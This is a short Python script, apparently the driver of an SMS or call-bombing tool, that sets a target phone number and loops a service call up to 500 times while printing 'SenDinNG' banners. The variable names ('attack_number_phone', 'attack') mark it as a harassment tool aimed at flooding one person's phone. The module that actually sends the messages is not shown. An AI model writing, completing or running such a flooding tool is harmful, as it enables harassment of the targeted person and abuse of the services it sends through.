import sys, os
from StructService import Distribution_Service
from config import attack
from colorama import Fore

attack_number_phone=Distribution_Service()
try:
    attack_number_phone.phone('+905333333333')
except Exception as error:
    print(f'Phone - +905555555555')
    sys.exit()

while True:
    try:
        attack_number_phone.random_service()
        attack += 1
        print(f"{Fore.GREEN}+-+-+-+-+-+-+-+-+-+->> {Fore.RED}[[ {Fore.YELLOW}SenDinNG {Fore.RED}]]{Fore.RESET}")
        if attack == 500:
            sys.exit()
    except Exception:
        pass

#
